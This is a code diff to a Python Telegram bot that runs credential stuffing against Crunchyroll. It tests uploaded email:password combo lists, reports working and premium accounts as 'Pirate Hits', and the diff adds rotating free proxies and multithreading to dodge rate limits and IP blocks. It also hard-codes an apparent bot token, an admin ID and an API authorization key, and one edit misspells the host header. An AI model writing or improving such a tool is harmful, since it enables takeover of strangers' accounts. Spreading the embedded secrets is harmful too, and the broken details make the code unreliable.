@@ -7,7 +7,7 @@ import threading
 import http.server
 import random
 from datetime import datetime, timedelta
-from itertools import cycle
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ============================================
@@ -16,32 +16,65 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 API_TOKEN = '8705949010:AAFmCQPSrVEjkWnZ5cbWysghLn1342xhVSs'  # Replace with your actual token
 bot = telebot.TeleBot(API_TOKEN)
 
-# List of Admin IDs - Replace with your actual Telegram user ID
+# List of Admin IDs
 Admins = ['6024704351']
 
 # ============================================
-# PROXY LOADER (READS FROM proxies.txt)
+# DYNAMIC PROXY LOADER (FRESH EVERY 30 MIN)
 # ============================================
-def load_proxies():
-    try:
-        with open('proxies.txt', 'r') as f:
-            proxies = [line.strip() for line in f if line.strip()]
-            # Convert to a format requests understands:
-            # "http://ip:port" -> {"http": "...", "https": "..."}
-            proxy_list = []
-            for p in proxies:
-                proxy_list.append({
-                    "http": p,
-                    "https": p
-                })
-            return proxy_list
-    except FileNotFoundError:
-        print("No proxies.txt file found. Bot will run without proxies.")
-        return []
+def load_dynamic_proxies():
+    """Fetches fresh free proxies from GitHub (updated every 30 min)"""
+    proxy_urls = [
+        "https://raw.githubusercontent.com/iplocate/free-proxy-list/master/protocols/http/all-proxies.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    
+    proxy_list = []
+    
+    for url in proxy_urls:
+        try:
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                for line in response.text.splitlines():
+                    line = line.strip()
+                    if line and ":" in line:
+                        proxy_list.append({
+                            "http": f"http://{line}",
+                            "https": f"http://{line}"
+                        })
+                print(f"Loaded proxies from {url}")
+                break  # Use first successful source
+        except Exception as e:
+            print(f"Failed to load proxies from {url}: {e}")
+            continue
+    
+    if not proxy_list:
+        # Fallback to hardcoded proxies if fetch fails
+        fallback = [
+            "http://2.56.215.247:3128",
+            "http://50.206.25.108:80",
+            "http://88.198.24.108:8080"
+        ]
+        proxy_list = [{"http": p, "https": p} for p in fallback]
+    
+    print(f"Total proxies loaded: {len(proxy_list)}")
+    return proxy_list
 
-# Load proxies and create a cycle to rotate them
-proxy_pool = load_proxies()
-proxy_cycle = cycle(proxy_pool) if proxy_pool else cycle([None])
+# Load proxies
+proxy_pool = load_dynamic_proxies()
+proxy_lock = threading.Lock()
+proxy_index = 0
+
+def get_next_proxy():
+    """Thread-safe proxy rotation"""
+    global proxy_index
+    with proxy_lock:
+        if not proxy_pool:
+            return None
+        proxy = proxy_pool[proxy_index % len(proxy_pool)]
+        proxy_index += 1
+        return proxy
 
 # ============================================
 # CRUNCHYROLL CHECKER FUNCTION
@@ -50,10 +83,8 @@ def check_crunchyroll_account(email, password):
     device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
     url = "https://beta-api.crunchyroll.com/auth/v1/token"
     
-    # NOTE: Check if this authorization key is current. 
-    # Old keys can cause immediate 401 errors.
     headers = {
-        "host": "beta-api.crunchyroll.com",
+        "host": "beta-api.crchyroll.com",
         "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
         "x-datadog-sampling-priority": "0",
         "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
@@ -72,18 +103,10 @@ def check_crunchyroll_account(email, password):
         "device_type": "samsung SM-G955N"
     }
 
-    # Get the next proxy from the cycle
-    proxy = next(proxy_cycle)
-    if proxy:
-        print(f"Using proxy for {email}: {proxy.get('http')}")
-    else:
-        print(f"No proxy for {email}")
-
+    proxy = get_next_proxy()
+    
     try:
-        response = requests.post(url, headers=headers, data=data, timeout=15, proxies=proxy)
-        
-        print(f"Checking {email} - Status: {response.status_code}")
-        print(f"Response: {response.text[:200]}")  # Print first 200 chars
+        response = requests.post(url, headers=headers, data=data, timeout=10, proxies=proxy)
         
         if response.status_code == 200:
             try:
@@ -97,30 +120,22 @@ def check_crunchyroll_account(email, password):
                 else:
                     return 'bad'
             except json.JSONDecodeError:
-                print("Could not parse JSON response")
                 return 'bad'
                 
         elif response.status_code == 401:
-            print("Invalid credentials (401)")
             return 'bad'
         elif response.status_code == 403:
-            print("Access forbidden (403) - Maybe blocked or proxy issue")
             return 'block'
         elif response.status_code == 429:
-            print("Too many requests (429) - Rate limited")
             return 'block'
         else:
-            print(f"Unexpected status code: {response.status_code}")
             return 'bad'
             
     except requests.exceptions.Timeout:
-        print("Request timed out")
         return 'bad'
     except requests.exceptions.ConnectionError:
-        print("Connection error - bad proxy")
         return 'bad'
-    except Exception as e:
-        print(f"Unexpected error: {e}")
+    except Exception:
         return 'bad'
 
 # ============================================
@@ -189,6 +204,10 @@ def handle_docs(message):
         bot.send_message(message.chat.id, "𝖭𝗈𝗍 𝖿𝗈𝗋 𝗄𝗂𝖽𝗌. 𝖳𝖺𝗄𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝖿𝗋𝗈𝗆 .")
         return
     
+    # Refresh proxies before starting
+    global proxy_pool
+    proxy_pool = load_dynamic_proxies()
+    
     file_info = bot.get_file(message.document.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
 
@@ -198,7 +217,7 @@ def handle_docs(message):
     with open("combo.txt", 'r') as file:
         combos = file.readlines()
 
-    results = {'total': len(combos), 'good': 0, 'premium': 0, 'bad': 0}
+    results = {'total': len(combos), 'good': 0, 'premium': 0, 'bad': 0, 'block': 0}
 
     status_message = bot.send_message(
         message.chat.id,
@@ -206,19 +225,27 @@ def handle_docs(message):
         reply_markup=create_status_keyboard(results)
     )
 
-    ip_blocked = False
-
-    for combo in combos:
-        if ip_blocked:
-            break 
-
+    # Multi-threading for speed (5 threads at a time)
+    def process_combo(combo):
         try:
             email, password = combo.strip().split(':')
             result = check_crunchyroll_account(email, password)
+            return email, password, result
+        except:
+            return None
 
-            if result == 'good':
-                results['good'] += 1
-                bot.send_message(message.chat.id, text=f"""
+    # Process in batches of 5 threads
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = [executor.submit(process_combo, combo) for combo in combos]
+        
+        for future in as_completed(futures):
+            result_data = future.result()
+            if result_data:
+                email, password, result = result_data
+                
+                if result == 'good':
+                    results['good'] += 1
+                    bot.send_message(message.chat.id, text=f"""
 ===========================
 ⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
 ===========================
@@ -229,9 +256,9 @@ def handle_docs(message):
 [ ⌁ ] Premium : Free
 [ ⌁ ] By : @noobpirate
     """)
-            elif result == 'premium':
-                results['premium'] += 1
-                bot.send_message(message.chat.id, text=f"""
+                elif result == 'premium':
+                    results['premium'] += 1
+                    bot.send_message(message.chat.id, text=f"""
 ===========================
 ⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
 ===========================
@@ -242,24 +269,20 @@ def handle_docs(message):
 [ ⌁ ] Premium : True
 [ ⌁ ] By : @noobpirate
     """)
-            elif result == 'block':
-                bot.send_message(message.chat.id, text="🚫 IP Blocked! Stopping the check process. Please wait 5-10 minutes and try again with a smaller batch.")
-                ip_blocked = True
-                break 
-            else:
-                results['bad'] += 1
+                elif result == 'block':
+                    results['block'] += 1
+                    if results['block'] >= 3:  # Stop if 3 blocks in a row
+                        bot.send_message(message.chat.id, text="🚫 Too many IP blocks! Stopping check.")
+                        break
+                else:
+                    results['bad'] += 1
                 
-            time.sleep(5) # Small delay to avoid rate limits
-            bot.edit_message_reply_markup(
-                message.chat.id,
-                status_message.message_id,
-                reply_markup=create_status_keyboard(results)
-            )
-        except ValueError:
-            continue
-        except Exception as e:
-            print(f"Error processing combo: {e}")
-            continue
+                # Update keyboard
+                bot.edit_message_reply_markup(
+                    message.chat.id,
+                    status_message.message_id,
+                    reply_markup=create_status_keyboard(results)
+                )
 
     bot.edit_message_reply_markup(
         message.chat.id,
